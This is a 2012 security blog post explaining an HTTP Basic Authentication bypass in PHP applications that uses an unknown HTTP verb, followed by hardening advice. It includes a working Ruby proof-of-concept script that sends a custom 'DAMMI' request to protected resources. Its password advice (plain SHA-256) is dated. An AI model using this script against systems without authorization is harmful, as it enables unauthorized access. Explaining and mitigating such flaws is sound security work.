---
layout: post
title: "Bypassing HTTP Basic Authentication in PHP application nominated as hacking technique for 2012"
date: 2012-12-13 07:51
comments: true
published: true
featured: false
categories: 2012 breakers appsec php basic-authentication design 
thumb: php.png
level:
hn: 
rd: 
---

Authentication is a cool topic in application security research nowadays. Last
April I posted about a real world security assessment activities over a friend
of mine PHP powered portal.

Using a malformed HTTP verb to request a protected resource, it is possible to
bypass the authentication mechanism for a PHP 5.3 written web application.

[The post I wrote](http://armoredcode.com/blog/bypassing-basic-authentication-in-php-applications/)
was mentioned in Jeremiah Grossman list for 
[the top 10 hacking technique of 2012](http://blog.whitehatsec.com/top-ten-web-hacking-techniques-of-2012/)

<!-- more -->

## Original work by...

I recap that almost 3 years ago researchers found that 
[it was possible to bypass basic auth in Zend powered portal](http://cd34.com/blog/web-security/hackers-bypass-htaccess-security-by-using-gets-rather-than-get/) 
and that [this vulnerability is not Zend specific](http://eguaj.tumblr.com/post/2361187940/re-hackers-bypass-htaccess-security-by-using-gets).

In order to support custom WebDAV verbs, PHP interpreter when it founds an
unknown verb it gives the script the control about how to handle that method.
Of course this can be mitigated in .htaccess file specifying which HTTP verbs
are allowed let all other verbs to be discarded.

## The attacking script

A raw ruby script implementing the technique described in [my post](http://armoredcode.com/blog/bypassing-basic-authentication-in-php-applications/) is the following:

``` ruby dammi.rb
#!/usr/bin/env ruby

require 'net/http'

class Dammi < Net::HTTPRequest
  METHOD="DAMMI"
  REQUEST_HAS_BODY = false
  RESPONSE_HAS_BODY = true
end

raise "usage: dammi url page" if ARGV.length != 2

begin
  http=Net::HTTP.new(ARGV[0], 80)
  r_a = http.request(Dammi.new(ARGV[1]))
  puts r_a.body
rescue => e
  puts e.message
end
``` 

The script needs two parameters: the host and the url to be requested. **There
is no** error checking on parameter passed from command line so you may want to
add your own in order to have a pure defensive code.

```
$ ./dammi.rb localhost /protected_resource
```

The following line is in my webserver's log:

``` 
127.0.0.1 - - [13/Dec/2012 08:14:17] "DAMMI /protected_resource HTTP/1.1" 404 40 0.0008
``` 

## Off by one

The fundamental rule here is that HTTP Basic Authentication is something you
want to use in your development or testing environment to protect your
application **before** you deploy it in production.

I rather suggest you not to use HTTP Basic Authentication at all, choosing a
strong authentication mechanism. Supporting OAuth is a great deal since you
demand all credentials issue to a well known authentication provider (e.g.
Twitter, Facebook, Github.).

Look at [this post](http://armoredcode.com/blog/crafting-an-authentication-subsystem-that-rocks-for-your-padrino-application-with-omniauth/) if you need to implement OAuth in a Padrino powered application using Omniauth.

As general rules, you may also want to apply:

1. Backends must be strongly protected by a login form with username and
   passwords
2. Passwords **must not** be saved in plaintext but encrypted using SHA-256 or
   SHA-512. Using bcrypt is **even better**.
3. Login forms must be served over an HTTPS connection
4. Your server side scripts must **always** check for authentication token in
   the HTTP session or wherever you choose to save it
5. Never trust users.


Enjoy it!
